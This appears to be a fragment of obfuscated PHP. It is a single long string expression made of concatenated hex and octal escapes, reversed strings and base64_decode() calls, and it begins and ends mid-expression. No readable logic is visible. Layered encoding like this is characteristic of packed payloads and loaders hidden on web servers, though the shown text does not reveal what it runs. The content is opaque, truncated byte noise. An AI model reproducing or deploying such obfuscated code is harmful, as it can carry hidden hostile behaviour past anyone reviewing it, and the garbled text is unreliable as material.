\x1d\x66\xa\x1e\x35\xa4\xe5\x11\x7\x6e\x93"."\x5f\x19\x54\xd2\xe\xda\x22\x7\x6d\xa8\x83\xb2\xee\xe\x24\x83\x35\x93\xd6\x74\x1\xd4\x25\xad\x41\x9f\x80\x96\xa5\x1c\x70\x5a\x21\x56\x39\xf8\xb1\x1b\xa9\x4e\x90\x15\x1c\x5c\x8e".strrev('tUİ$B;ŠªuíŒhé¼VCâÅå'."\n".':*™¦ €e-àÜ!	5¤ëŸ-u$p').base64_decode('S7DIH3zUKcKmFR6C48K/FnMsh1W3yIMiHhTDCUqYKf7wg2p+oMoZRbvIZj8O')."\x85\x95\x86\xe5\x64\x48\xa8\xce\x94\x93\xb4\xae\x22\xb1\xf8\x3b\xa8\xc4\x46\x62\x5c\xec\x6b\x16\xa4\x48\x6b\x88\x61\xf\x42\xe5\x62\xf8\x58\x7c\xa\x18\x8e\x31\x74\x1d\x77\xe8\xa1"."\164\40\51\342\61\214\264\340\353\230\13\204\367\51\220\343\173\53\244\146\41\100\345\5\172\105\101\1\116\36\363\204\27\220\15\302\225\303\63\116\362\245\120\30\357"."\x8a\x38\xd8\xa8\x3f\x76\x0\x1d\x1d\x4b\xbd\x30\xc8\x11\x85\xe\x81\x4\x2b\x70\x8\xbb\x17\x44\x6c\x27\x9f\x72\x21\x48\x7e\x54\x2d\x82\xc7\x3d\x92\x61\x2\x35\x9b\x8\x1b\x6d\x85"."\363\322\251\146\107\324\254\170\322\301\241\234\74\363\335\1\42\256\355\154\246\171\254\157\114\276\370\111\212\203\234\260\70\200\204\334\57\20\161\56\315\203\326\303\254"."\x42\xdb\x49\x49\xb6\x96\xd3\x35\x4e\x3a\xdd\x5\xc4\xc3\x88\xd\x71\x9\xca\xa6\x64\x9d\x8f\x29\x5d\x61\x10\xcd\xf9\xf9\x11\x4c\xc2\x83\x42\xb2\x84\x3c\xc8\x77\x2e\x4b\x1e\x61\x9d".base64_decode('GOYIbb34aS0UB5vHCrQxqbdYUFyCquEHY1fsG/U0rBUNwrMY+q0h/KdXoZYN').base64_decode('CMmNZRRGdrKIIE2ylWnNhxvoYcQNsHppQHx1F1xMrZCWisSRETMD0m38LSTK')."\xd9\xc9\xae\x65\x5b\x28\x0\x15\x26\x64\x1b\x84\xd\x6a\xb\xf2\xca\x2d\x74\x8a\x60\x79\x2e\xa7\x64\xe3\x30\x89\xb0\xd8\x2c\xc5\xd2\x73\xbd\x2a\x92\x21\xe\x4\x6c\x97\x8e\x49\xa3"."\xb\x70\x67\xe4\x7e\xce\x51\x25\x6c\xb1\x7c\x7d\xaf\x30\x10\xc3\x42\x48\xe9\x2a\xdb\xb0\x99\x40\x12\x8c\xca\xba\x4b\x7\xf5\xf3\x96\x73\xd2\x41\x58\xaf\x3c\x3\x2c\x23\x1d\x41\x85".base64_decode('FsuBY/waFSPg+vHGVRNCIHnU6OkgTyhcmzGYSL3gmLkKJotzWI4plpTFtgZX')."\5\242\346\56\276\171\211\133\237\170\63\10\357\26\361\227\160\213\236\141\227\215\10\350\62\114\55\307\143\204\40\216\26\242\170\241\102\52\66\374\250\115\200\234\307"."\21\227\302\7\15\245\45\171\221\270\201\361\336\225\6\51\204\23\154\137\263\107\327\51\232\340\16\301\263\115\0\24\101\160\215\207\350\341\154\61\242\215\13\367\16"."\xf2\xdb\x71\x5c\x14\xac\xd8\x85\x77\x1b\x97\x1c\x8f\x7\xe8\x59\xa3\xf8\x5d\x98\x54\x3c\x7a\x29\x5e\x10\x52\x58\x60\x45\x9\xa1\xe2\xc9\x3d\xe9\x34\xbf\xcf\xb4\x87\xc7\xcc\x82\xd7".strrev('Ô¥5ë°aâĞŸ1òw±¥Ò³I²íø¾ef3"–qŒ¡âôı±­™Œ„I˜¬')."\254\142\260\315\113\67\212\364\30\142\346\130\323\4\343\204\303\61\40\377\1\200\270\57\260\23\40\116\24\204\255\17\155\43\21\323\262\151\7\121\31\2\252\132\106"."\x1f\x2c\xd\x3c\x92\x2d\xba\x96\xf1\x5\x0\xea\x17\xc7\x7\x7b\x3a\x85\x9e\x81\x21\xa\x33\xac\x16\xeb\x28\x98\x3f\xb8\xe3\x8f\x55\x26\x8d\x66\x45\x71\xf6\x60\xdb\xd\xf8\xf7\xdc".base64_decode('v21e/zbZzvIjSXOAbNjkVBz8PXDlQfib6yadueTj89568uiDzrnuhXd7H8jd').base64_decode('faF/0cu3bFiTyr/xykn3n7Rs8JPZa8+eOOeSe0rmHOWuVD9uaHnr8e8uLPGG')."\xae\x2d\x3f\xe9\x2e\xcf\xcf\xee\x9a\x7f\xd5\xec\xf9\x67\x1c\xd8\xfe\xb7\xcd\x1f\x8e\xce\xd2\x5e\x9c\xb8\xf3\xd9\xb\x2e\x79\x70\xc3\xed\xb7\xcd\x4e\xae\x9e\xbe\xf3\xcb\xab\x8d\x87"."\46\236\74\62\263\372\363\365\237\325\177\277\157\375\211\107\275\21\330\325\163\370\212\57\273\223\375\177\72\267\357\353\5\333\226\137\264\241\275\46\176\376\347\45\217"."\x7a\x96\xbc\x7c\x9b\x6f\xe5\xf0\x48\xf6\xbe\x7b\xfe\x18\x7e\x6e\x5d\xd0\x3d\xdd\x77\xc4\xf7\x13\x6f\x7f\xfa\x97\x7b\xd3\xe7\xd6\x69\x47\xdd\xbb\xfb\x8d\x3b\xd7\x6f\xb8\x74\xc5\x31"."\xa1\xdd\xff\x5e\xff\xec\xe9\xa1\x47\xaf\x31\xe3\x6f\xf5\x1d\xb5\x3c\x32\x63\x52\x77\xf2\x8e\xfa\xc6\x1d\x8d\x5f\x7c\x78\xc9\x35\x97\x85\x36\x6d\xf8\xdd\x31\x3\x3d\xff\xcc\x5c\xd1"."\234\170\352\330\217\46\353\115\177\253\32\167\366\13\137\77\265\361\231\27\32\116\370\172\325\356\13\216\370\331\317\62\207\205\74\327\277\70\361\201\217\366\246\156\71"."\350\356\77\275\177\363\303\217\354\73\352\206\11\27\266\355\132\76\347\312\252\163\153\37\173\377\371\341\353\116\70\177\324\237\173\113\37\377\100\305\350\364\317\356\236"."\335\375\173\357\211\53\317\77\360\37\13\116\14\164\35\174\346\367\376\243\357\376\373\51\75\25\65\235\357\76\260\164\370\363\255\157\175\64\367\255\333\16\376\327\263"."\xe6\xb9\xfe\xe3\x66\x54\xe8\x4b\x57\x1f\x71\xf1\xf4\xd6\xcb\xbe\x5e\xad\x2e\x98\x31\xb5\xfa\x36\xf5\xde\x6b\xdf\x7e\xe4\xda\xe7\x4e\x78\xf2\xc8\x5c\xa6\x72\xd5\xae\xf1\x87\xbf\xf1"."\x55\xf6\xb7\xb7\x6d\xdd\x7d\xd3\xd2\x45\xcf\x6f\xde\x31\x9a\xaf\x38\xee\xa4\xf5\x27\x2f\xf2\x5f\x90\xba\xe9\xde\xf2\xa7\x83\x87\x4e\xc8\x55\x54\x5f\xbd\xb4\x6b\xe3\xc7\xb\xbc\x9b".base64_decode('DvjNtrN+NXrcRO9pr69/OPLU6L3nxQ/cO3tf48WXViyuad/vk0zk4glHP+1Y')."\xf8\x93\xf7\x7e\x35\xff\x89\xe9\x3f\x73\xaf\x79\x7c\xcd\xc0\x2f\x3e\xb8\x4d\x5f\xfd\xd8\xbd\xab\xf3\xc7\x5d\xf5\xfa\xb3\x37\x6f\x3e\xf4\x89\xf7\x67\xbf\x94\xff\xcd\xa9\x77\xbe\x10"."\330\326\166\123\133\327\161\37\266\34\363\264\167\317\326\315\247\337\326\377\106\311\223\177\277\362\335\127\67\254\32\277\141\261\162\321\236\13\327\276\372\172\262\323\35".base64_decode('XdWyR+43Pr31o9FlFy46Ot1w7eennnrea56zrvZcV/tfhx1w6hnxj46YM3tu')."\366\375\237\374\153\173\64\175\127\142\311\65\233\17\174\363\237\17\317\72\177\345\70\365\370\75\237\167\36\341\70\133\73\267\144\302\145\263\137\137\73\337\275\146\377"."\133\17\276\301\125\376\170\135\315\23\253\112\246\135\272\146\327\331\137\135\60\374\306\272\27\267\32\217\35\363\115\311\204\117\317\74\174\111\353\57\374\307\377\345\17"."\267\237\341\130\161\307\236\341\143\216\73\157\173\107\342\212\236\131\177\52\377\140\355\41\207\206\316\150\72\361\375\323\112\165\175\365\312\272\211\7\337\243\156\255\255".strrev('ş\\'."\r".'Æƒ“÷:ìçÉèßR©İBtY{³RÿËšão¶¦é»Êûİgu©¥±åq£ù')."\155\315\336\345\376\313\66\265\137\360\305\303\137\176\177\131\154\173\111\315\243\337\237\264\371\316\165\211\47\234\23\46\375\141\333\364\73\256\227\36\135\365\314\325\73"."\xa7\x1c\xdc\x32\x25\x16\xaf\xbb\xe6\xf6\x96\xa7\x76\xbd\x3b\xe1\xa2\x49\x87\x68\x77\xdc\xf7\xfe\xf0\xbb\xdf\x7b\xdf\xda\xfd\xe4\xd7\xab\x8e\xc\xa9\x93\xaf\x38\xf7\xd7\x81\x99\x7f"."\x39\x78\xff\xca\xda\x81\xf6\xfe\x71\x5f\xcd\x3e\xcc\x39\x54\x7b\xd0\xec\x75\x65\x77\x18\xf7\x37\x3d\x79\x67\xfa\xd9\x7\x7f\xf9\x79\x34\x3d\x65\xd3\x1f\x2e\x98\x33\x38\xcb\xbb\xe9".base64_decode('gimnyuf7Hrp7Wu0RH+1edFDvVbGj3lpVM+mBlzaU3DQzuePAL4+f8oq0/siP')."\247\137\271\361\302\360\247\375\307\154\315\214\166\372\217\77\341\331\253\167\334\363\132\360\374\165\27\77\170\363\212\341\147\207\117\373\362\200\321\5\177\251\217\305\306"."\377\364\236\215\67\276\376\212\67\270\165\375\207\33\377\320\177\321\333\225\352\117\256\232\363\335\11\343\22\57\34\32\275\271\151\101\311\153\235\352\65\177\174\367\210"."\xc3\x4f\xfb\x74\xe2\xc9\x75\xde\xf3\x94\x8a\x5\xde\xf2\xca\x71\x2f\x2c\x6e\xba\x7e\x5c\xfa\xa6\xc4\x5b\xa7\xdc\x3c\x29\x73\xc1\x91\xcf\x3c\x32\xe7\xb4\x5f\x7\xcf\xfe\xf5\xe9\x3b"."\26\37\121\72\273\154\333\274\135\307\157\174\356\224\337\346\2\237\214\277\142\367\311\311\326\343\307\37\164\361\163\177\315\116\332\224\166\74\63\131\232\363\363\111\355".strrev('÷úÿÓ{ş¸äwŞëJ»Gö_Ôïhì}Ï“±êp<ßÉó=¯ç“îñ½òüÏå').base64_decode('1dOPyvXtCm04uWlt8NBfv6POjzzTcvH+3kmVmy59/4jNNx6ptb/xvMPx5OTH')."\xc6\xe7\x7e\xf3\xf1\x5d\xcf\x7f\xb3\x20\xff\xee\xf6\xcf\xd7\x1d\x3b\xfe\xf6\xef\xef\x2d\x5f\x77\xdf\xc4\x97\x6e\x5d\xf1\xe2\x9a\xf2\x6d\xcf\x7f\xbf\xee\x8d\xe3\x6\x72\x6f\xef\xbf"."\xe9\xca\xc1\xdc\x59\x9f\xbe\x97\x3f\x77\xc7\x3f\xe6\x5e\x76\xfd\xd1\x3f\xdc\xab\x7e\x73\xff\xd\x6f\xbe\x76\xd5\xd1\x7f\x59\x5b\x32\xf7\xad\x97\xaf\xfc\xea\xe\xf5\xa3\xd8\xbb\xd3"."\236\313\357\270\50\354\176\172\334\147\257\137\171\330\172\145\311\332\111\227\166\274\375\360\103\201\177\135\276\174\357\123\357\171\37\375\52\330\277\353\332\27\236\77\360"."\222\113\316\271\343\212\71\362\5\362\373\367\237\161\367\350\113\307\255\375\351\151\137\226\117\374\142\316\347\173\246\136\74\51\377\362\207\203\55\127\377\42\125\325\264"."\351\231\362\306\317\162\165\177\34\271\356\356\75\353\176\367\273\253\347\235\32\210\157\151\57\273\160\336\374\257\216\212\270\47\176\365\134\367\137\357\310\136\174\310\313"."\177\77\145\370\253\115\247\275\371\344\207\351\77\370\53\316\31\177\174\252\262\353\353\303\167\327\175\163\372\202\245\263\316\325\17\55\73\162\366\145\325\257\335\362\355"."\7\163\157\276\375\233\367\327\157\76\175\316\3\367\172\357\237\172\337\305\57\176\164\326\347\243\351\113\76\174\121\171\142\345\327\123\47\154\371\356\234\354\45\312\237".strrev('Ñ–äÑì}N¿ßÏûÚpÜ©¾uÓê¹Y5¾Oë}¥ğéÛæúˆıÒÜ¯½şşô').base64_decode('L3ef37Dl+923dgdOjOz77ovNJ65a+fU/P/y4O7Dlvm8/OPHYz0751+6tW3pP')."\371\362\215\355\237\375\366\366\333\17\177\364\207\231\163\277\271\372\304\376\175\237\134\363\360\253\263\67\44\312\217\320\347\311\327\355\173\67\173\370\115\235\65\347\270"."\16\127\127\77\73\267\372\332\207\317\333\376\306\137\73\313\52\57\237\260\340\241\207\167\125\137\363\376\344\325\167\156\274\342\371\237\34\261\352\341\346\331\353\377\274"."\xe6\x17\x5f\x67\x3a\xcb\x5f\xd9\x38\xe3\xce\xeb\x97\x4d\x98\xf6\x5c\xcb\xf7\x75\x9b\xce\xea\x79\x7a\xe2\x27\x35\x8b\x27\x7c\x1f\xac\xa8\x99\xf4\x50\xfe\x3c\xe3\xc0\xe3\x12\x5b\x2f"."\32\167\372\312\203\116\75\156\160\361\123\53\207\126\76\273\167\175\331\237\313\17\370\343\153\47\34\66\376\363\366\307\172\37\130\66\234\351\337\373\356\236\347\172\372".strrev('Ÿïzvô5ş÷lT­ü©¶­>ÏGgÌÿ]oÆ·¼ìûm¶Öï›çê~o;Á¢š').base64_decode('1p7zV1d+4qKdw6tW7z6r9NhVs56InHRLY+Puay/9dnzJ+09c8otONbflz//1').base64_decode('07pHZy94/nZfTXhPb9nD9zWe9s2yv1605tdrew/cs2TT0ec1fXDG3/9x4oSf').strrev('÷ßåhÅş¶Üw3Ñc£÷!âşwKÆåø/EöZ—®CÔúø>ossm±úÊ')."\xec\x39\xb\xbf\x71\xce\xba\x6a\xdd\xe2\xbf\x19\x2f\x3d\xe7\x9c\x75\xfd\xbc\xd5\xf3\xdb\xfe\xf9\xce\xbf\x17\x7d\x58\x75\xce\xb\x6f\xc7\x7f\x3a\x67\xf5\x86\x47\x5f\x5d\xd0\xfe\xd2"."\153\231\344\200\376\321\255\13\136\272\347\104\165\341\266\55\357\354\256\333\325\267\167\355\376\47\137\375\316\204\326\307\136\315\165\375\375\270\335\327\274\166\124\153\317"."\313\245\77\170\372\137\277\364\137\233\126\71\316\374\346\323\313\307\75\37\275\367\244\163\7\347\36\371\312\307\346\133\63\135\216\215\27\335\277\245\373\215\343\257\174".base64_decode('N3XI4Q1fH9NywOWHXRwZ/fjW9Dtv9t11//4v/WpO39srv6gI52vf+/yKMyc+')."\176\321\314\277\34\167\303\65\377\274\247\46\73\171\177\303\77\72\347\254\173\53\337\172\152\374\43\157\36\327\362\336\324\255\321\351\147\136\361\363\175\273\16\162\356"."\74\252\261\154\317\263\237\204\314\325\373\157\333\134\367\320\322\17\246\136\262\347\325\376\206\330\376\263\253\37\332\373\370\345\17\34\371\121\327\103\225\127\314\31\137"."\xf6\xf2\x49\xed\x4f\xf5\xbe\xf7\x66\x7f\x74\xdd\xe9\x9f\x3a\x36\xb4\xef\xdb\xef\xcb\xef\x32\x4f\x1e\x3a\xb8\x21\xfe\xf4\x19\x7f\x8\xff\x7e\x45\xf9\x9c\xbf\x5d\x37\xe3\x6\xdf\x53"."\xfd\x89\xe0\xf2\xb3\x6f\xb9\x74\xfb\xcc\x49\x27\xef\x38\x6c\x41\xc7\xd6\xb\xb3\x3d\x2f\x3f\x34\xf3\xc1\xd3\x1e\xe9\x73\xff\x2a\x7e\xc9\xf2\x71\xe3\x7b\x7b\x56\xbe\x3a\x7c\xfc\xb3"."\xe7\x84\x4e\x79\xfb\xb8\xcf\x57\x37\x3f\xdd\xf7\xc2\xc2\x8b\xae\x9f\x95\x7f\xe2\xd8\xd3\x77\xba\xff\x31\xfc\xc4\x87\x53\xce\x6b\xb8\xf1\xbb\xdf\x7f\x77\xec\xfb\xb5\x7e\xf7\xa7\xb3"."\237\335\176\264\176\341\203\207\337\174\155\333\244\117\347\175\263\250\361\330\177\326\276\173\336\347\321\35\13\133\327\335\346\154\136\270\337\75\127\137\76\345\312\235\7"."\xb9\x77\x5d\x79\x90\x7c\xf6\x84\xd3\x16\x6d\xad\xc8\x3c\xf8\xd1\xea\xd5\x77\xbd\xd3\xf3\xd0\x7f\x57\x5e\xfd\xf3\xc7\x9e\x3c\xa3\xac\xb6\xa4\xb4\x74\xee\xd6\xcd\x93\x6f\x3d\xfd\xaf"."\213\77\211\377\166\313\310\135\267\135\76\376\272\301\203\266\235\171\303\363\257\116\315\354\133\43\77\167\317\147\237\256\273\311\70\65\173\372\373\167\334\61\264\171\133"."\xe6\x65\x2d\xd3\xb0\xf2\x90\x6d\xf5\xde\x5b\x37\x7a\x2f\xcb\xdc\xb8\xe6\x90\xbd\x1f\x8f\xff\xe7\x41\xa7\x39\xc7\x9d\xa5\x6c\xea\xfa\x79\xf2\xfb\x9f\x1e\x1b\xdf\x35\x74\x71\xf7\x7e"."\173\176\366\110\305\143\237\237\365\103\370\372\337\224\55\134\131\367\336\326\252\23\166\56\257\377\100\363\334\162\342\376\163\46\134\346\335\276\337\176\65\357\116\174\373"."\xad\xf8\xc0\x9\x55\x4f\xc8\xed\xf\x3c\xf2\xcd\xc6\x9f\x75\x7d\xfb\xe6\xea\xb3\xae\xb8\xc4\xfd\xc7\xa7\xcf\x9c\xd4\xed\x1e\x29\xad\x71\xa6\x7f\x36\xef\xc2\x53\xba\xae\x3d\xe2\xfd".strrev('¶>ßËa¬}íÔ×7ÌñŸáŞå°×¿ß½÷ıÛ»zùNSó¹_/ŠÃK~¹|?•')."\xa6\x34\xf2\xe4\xf5\x3b\x3e\xfa\xa2\xf5\xf2\x7f\x7f\x3f\x75\xdf\xde\x1d\x81\xcb\xaf\x59\xa5\x7f\xf7\xee\xfd\xc7\x6e\xd9\xb7\xed\x89\x83\x3f\x5b\x76\xca\xf\x9b\x6f\x72\xcf\xfb\xe1".base64_decode('sy0NyZqDX1975MYvjr9g/N+vNQea1zx931Nzt62dO+vk1W1b9y7/9KMvv5zw')."\366\201\75\167\275\266\243\343\246\155\37\176\372\351\327\173\76\333\363\363\303\17\156\175\354\305\141\175\245\376\331\276\236\237\137\360\347\11\257\377\376\371\233\267\336".base64_decode('+8k9j/d86/nV1c7uj40Nky+/dMF/L9aO+vRfRzxw0MDvSg6/pedG300bvnVU')."\154\172\376\222\375\224\317\156\77\373\276\245\372\41\335\37\336\234\72\373\352\255\347\274\64\137\137\366\273\45\57\154\230\162\301\245\377\372\313\324\370\246\165\65\333"."\xbb\x5a\xc3\x87\xde\xf6\xf6\x91\xef\xc4\x8f\x79\xe0\x72\xf5\x98\xee\x2f\xe7\x7f\xf3\xda\x3\x2f\x27\xb6\x3d\x79\xd4\xb7\x27\x3a\x9f\x73\x2f\xb8\xfa\x58\xaa\xd2\xae\x46\xfb\xb4\x41"."\x2a\x3a\x13\xf5\x88\xe1\xb4\x3c\xd0\xa7\x13\xf5\xa1\xfe\xf4\xd0\xe8\xb0\x4c\xce\x7\x6a\x88\x84\x3a\x6c\xf6\x27\x75\xa2\x87\x44\x54\x7a\xe5\x58\x34\x91\x1c\x22\x32\xc6\x8c\x99\xe4"."\32\255\272\206\250\241\324\314\242\27\153\321\321\241\54\225\274\252\247\21\350\254\71\344\167\332\54\42\306\214\312\52\73\217\322\63\375\243\3\271\76\22\63\24\113"."\203\346\221\326\215\244\242\203\131\122\332\140\277\221\35\212\247\150\111\370\227\374\314\236\115\216\76\146\325\314\44\21\325\244\356\31\263\110\235\325\263\110\137\6\345"."\276\204\101\65\15\147\115\47\155\233\121\115\162\116\247\272\267\351\304\140\256\217\310\4\63\147\223\314\64\371\150\26\10\307\114\211\177\240\57\335\257\44\351\130\120".base64_decode('3Rx1OD1iELlhMJ/IacOkX3NmkyTJqJzPKPR+Mp5I9g/SQRkcyqTpoVDNNJJ+').base64_decode('SJFzUSrGAEkjlsyReTKzWj4RHyXJRkfi/X3k0kwbTSnJ/AhtPilJyWUHk30E').strrev('£âÕ7U4Ñåû†@ƒ;ÓgL(jo‘&rP5CZƒ%¥•Q”ç‹ï}#Nf')."\203\52\351\343\34\252\346\224\63\224\276\41\223\116\32\301\274\71\64\72\247\304\315\264\226\247\330\103\332\221\210\253\351\276\176\162\121\53\147\7\225\141\252\14\64"."\275\206\44\211\146\262\311\341\101\62\55\263\147\22\350\320\100\76\251\346\110\132\65\37\115\14\323\113\314\130\166\170\150\40\101\146\156\104\325\364\24\125\75\233\115"."\307\174\146\65\151\335\354\71\144\30\252\51\22\364\345\223\303\361\4\105\202\270\46\367\247\111\77\207\342\43\212\74\114\316\152\346\124\21\344\111\47\106\123\203\3"."\144\320\247\325\20\304\34\316\50\203\106\124\243\370\110\306\160\146\15\311\64\0\266\163\63\117\60\147\70\227\115\310\164\62\153\150\222\101\200\152\321\230\116\347\145"."\72\255\200\124\117\61\172\126\25\251\261\57\232\32\64\163\364\266\136\117\305\207\222\124\237\175\140\70\252\345\50\75\240\363\62\224\351\213\353\51\162\67\334\17\272"."\334\107\117\300\324\130\132\61\351\12\115\216\16\352\321\41\322\151\145\40\336\257\146\22\264\146\322\253\254\71\30\317\214\262\225\102\346\107\123\372\315\144\232\340\325".base64_decode('tCrafJKnf1AdVRJkWjJaOmoopI5hcyAR7YvRFTOQl+llVEbNJQap1mWqbzga').base64_decode('N+hdb8oYjjPd7nh/ykznKLki86sk+7MDGmn6nGoynH1GXE+MkozRfmU4PkoG')."\x6d\x1a\x1d\xe9\xe1\xd1\x64\x66\x24\x9a\xa0\xa3\x37\x8d\x52\x20\x12\xbd\x34\x43\x5a\xd7\x28\xc7\xfa\xe9\x11\xb3\x61\xca\x66\xde\xb0\x25\xa0\xa6\x11\x31\x51\x39\xb6\x5f\x51\xa8\x92"."\46\125\376\344\167\341\106\36\251\223\323\170\176\114\1\117\232\204\73\163\30\14\211\151\143\131\123\210\6\41\113\54\74\254\207\247\51\70\24\62\65\235\335\331\143"."\x6d\x20\x17\x6c\x95\xcb\xda\x89\xaa\x6a\x4b\x8a\x78\xd4\x12\xcf\xa0\xf4\xdc\xc5\x1e\x93\xb0\xc3\xa3\x68\xb8\x98\xae\x5\xfc\x8f\x74\x6\x1b\xd4\x18\xca\x40\x5e\x61\x9a\xdf\x38\xb5"."\x8b\x8e\x51\x54\x18\x6b\x7c\x30\x6e\xca\x46\xbf\x4b\x4\x3b\xc5\x58\x35\xb\xaa\x4e\xa7\x5d\x56\x43\x2b\x68\x75\x43\xa7\x26\xc2\x15\x51\xe1\xf0\x74\x9\xfa\x11\x30\x2c\x9c\x56\xf2".strrev('ºrÏÁ•ñr‘²µ€Ø»áAš#±a¸Ğa}'."\0".'íTyÖR0»Œ¡à')."\xd6\x6\x15\x29\x21\x3\x40\xbc\x56\x4a\x0\x2c\x90\xa8\x8e\xb4\x64\x6a\xf4\x9b\x8c\x97\x1b\x8e\x97\x1b\xd5\x2a\x8c\x95\x18\x87\x9b\xea\x1a\xa3\x59\x96\x7e\x27\xd9\x51\x34\x3f\x17".base64_decode('JY0VlIDxxQMHiOhjxWoLYlnXA7nSQ2ZWDglX6JDQXaFkNQHyNUvs0lXEHrGR')."\xba\x92\x4b\xcb\x31\xd6\xc0\xdc\x48\xd1\xe1\x13\x9b\x23\x5e\x54\xda\x3a\x60\x59\x88\xf6\x2e\x58\x22\xc1\x28\xe7\xa9\x22\xad\xe5\x82\x4e\x6b\x4a\xcb\x86\xc1\x15\x5c\xd1\xb5\x2d\x6f".strrev('ˆsšPšT¹'."\r".'u6÷-Ö@‚:)„îè¼:¤¥J†ú¥\\JëG](•»².')."\101\27\271\240\212\10\365\222\157\256\172\56\102\323\366\273\40\272\34\135\315\215\202\255\43\114\106\162\360\173\76\0\363\102\335\251\261\340\315\354\236\134\12\345\223"."\111\305\60\153\221\71\205\124\51\201\266\314\162\325\200\17\204\310\63\134\263\300\47\32\10\162\245\322\233\345\365\342\257\174\26\176\7\363\131\270\364\153\205\126\45".base64_decode('SK9cPK1cyeOV+EQyMkIfhkgCmrfdOvCgdU42F2B8wdYQN5CCGFlopEhDMAUL')."\xf2\x69\x84\xd9\x51\x67\x7e\x24\xab\x29\x8e\x79\xe\x6c\x3f\x59\xa6\xef\x65\xa4\x65\x7a\xc5\x65\x80\x3d\x49\xcd\x2a\xc\x1\xf2\x6\x57\x8f\x95\xf9\x82\x84\x5f\x7c\xd\xe1\x18\x68".base64_decode('EuMjowg1LiOxtGYI6SNJxYyQbY+0u9ET8jVFOj1UjVrO5dxg4zbcUE9KHVT8')."\x6a\xd4\xd\xed\xcd\x20\x8a\xb8\xa2\x54\x53\x0\x8c\x11\x18\x57\x39\xaa\xe9\xa6\x80\xb8\x91\xb8\x4a\x1a\xea\xf7\x35\x46\x9a\x7d\x41\xa1\xe6\x5c\xde\x5e\xb3\x68\xf9\xeb\xe9\xf4\x45"."\102\241\200\320\216\132\201\306\102\163\13\176\143\13\103\334\354\2\336\202\210\312\61\206\61\244\351\244\111\320\62\23\352\304\206\44\142\303\5\320\273\251\315\23\144"."\x7a\xaf\x33\x5c\x55\xae\x6a\x9e\x16\x54\x18\x81\xea\xbf\xf5\xd4\xe6\x2b\x14\xf6\x4\x8b\x58\xe9\x62\xeb\x5d\x82\x2\xc4\x62\x97\x64\x68\xb\x74\x4b\x4d\x1\x7f\x57\x7b\x47\x8\x9b"."\xa5\x62\x78\x47\x40\x88\x47\xda\x8d\x24\x9a\xda\xf0\x16\x46\x93\xe2\xbd\x9d\x7e\x4f\x93\x57\xf2\x75\x84\x3\x54\x7d\x99\x29\xa9\x21\xc5\xf5\x10\xb\xd3\x21\xd0\xd\x85\x59\xe7\x92"."\374\70\40\52\327\213\45\262\222\310\242\351\161\224\366\226\364\126\364\226\365\226\57\167\365\32\313\334\342\224\220\55\260\263\231\164\251\226\175\261\175\263\75\24\132"."\104\154\62\2\101\117\223\237\126\17\160\215\174\6\232\174\370\143\347\45\267\177\160\337\171\73\257\332\264\375\354\265\240\240\35\353\116\337\161\371\335\37\334\263\166".base64_decode('1xkPbt907s6Hzttxya07zj2NtHnXrZs/eHDLzktu3L7pih2X3btz3X/hiA83')."\334\276\375\234\33\131\303\244\17\57\176\150\307\171\177\332\161\351\155\73\326\156\332\176\337\305\333\37\70\175\373\75\367\70\100\356\17\317\134\273\363\301\115\73\316"."\272\154\307\372\123\167\374\367\232\35\277\137\273\375\234\77\156\277\362\306\235\347\335\272\375\272\63\266\257\136\273\353\326\113\47\332\221\7\207\173\350\360\223\53\170".strrev('©Œ'."\n".'æs@¢İ¯&©KA”{*—àĞƒ-ø9g£^ÒEF½É÷')."\xe3\x65\x10\x73\x68\x1a\x8e\x20\x23\x92\xd2\x31\x5b\xb1\x92\xcc\xb9\xd0\x28\xa1\x31\xcd\xde\x50\x53\xd0\xd7\xe8\x25\x3a\xb6\x6c\xa2\xa6\x20\xf5\x4d\x72\x93\xf\xa0\xa1\xe0\x62\xf6"."\315\314\152\12\214\320\245\62\212\300\345\222\245\43\262\53\246\245\363\231\54\152\254\124\2\225\153\112\34\220\206\40\236\113\52\201\333\44\0\50\61\260\334\312\240"."\165\52\322\13\54\135\132\352\250\162\124\227\113\304\102\35\347\40\26\351\122\11\321\372\144\371\54\225\70\242\226\120\265\243\252\134\52\311\365\227\220\166\361\161\5"."\255\217\340\224\206\44\73\312\110\203\305\346\362\264\200\106\31\246\56\253\200\150\111\61\7\3\261\374\340\327\142\145\36\163\361\34\170\236\100\12\73\114\362\164\64"."\x5b\x53\x62\xe3\xf4\xce\x52\x49\xce\xc6\x41\xc\x1e\x5f\x71\x9a\x4b\xcb\xa5\x28\xd1\x5c\x2e\x12\x89\xb2\x59\x6\xa3\xde\x32\x18\x65\x95\x84\x36\x74\xb6\xb2\xf9\xc6\xca\xc6\x12\xb6"."\x5a\xc1\xcd\x92\xd\x3a\x51\x4\x8a\xa6\xa\x42\xf1\x6c\xd1\xb4\x1a\xe8\x6\x98\x1c\x9c\x1e\x7c\xb0\x98\x7e\x65\x84\x97\x4\x48\x10\x8b\xa0\x33\x8\xe1\x6c\x12\x8b\xc4\x21\xaf\x1".strrev('ÉN* ±Nh	,aµ7'."\r".'ãhÏ˜FeËŠÖRûzÙˆŞJIÌıÃ˜%')."\x82\x22\x69\x6a\x40\x4a\xd2\xe1\xe5\x2\x9\xc2\xa1\x28\x9d\xaf\xa3\x25\x10\x6c\xc7\x76\x27\xa1\xa6\x36\x6f\xbb\xc7\x45\x8\x37\xc6\x4\x9c\x1e\x32\x53\x52\xbd\x54\xa\x29\x1f\x6"."\x95\x5a\x86\x1f\x55\x44\x87\x2c\x8c\x6a\x5\xeb\x2a\x62\x2\xb6\x9\x8f\x42\x2e\x49\x1a\x43\x66\x5f\x42\x66\x88\x32\xca\x52\x5f\x8a\xad\x7a\x49\x91\xcc\x45\x46\x20\x18\x8e\x80\x1"."\40\344\131\240\272\245\302\16\41\250\244\102\363\211\101\306\262\313\61\40\207\122\243\365\50\75\204\3\205\303\62\233\2\35\55\76\152\142\323\34\265\304\65\7\175".base64_decode('0JKUVCvREiJcTwEEckNx9s2tKGEE29FBgG/oMEZw6AGrCXWwb86rggBUDeS0')."\xb5\xbb\x99\x7d\xb7\x31\xeb\x37\x18\x11\x8\xa\x1\x4f\xd0\xd3\x1e\x62\xc1\x60\x37\xa0\xd5\x10\x26\x58\x81\xb5\x7b\x42\x61\xd0\xab\x8e\xae\x76\x4e\xcf\xfd\x9e\xc5\x0\x15\x2\x9c"."\345\240\264\270\314\125\321\120\336\213\155\134\360\47\376\231\117\103\320\66\140\331\212\152\207\64\163\125\71\111\103\255\102\42\146\112\315\122\136\25\326\262\310\37\361"."\x7\x5a\x71\x18\x39\x1a\xf1\x66\xe3\x5c\x9c\x90\x7a\x24\xc0\x17\x87\x39\x5f\x6c\xd0\x8d\x8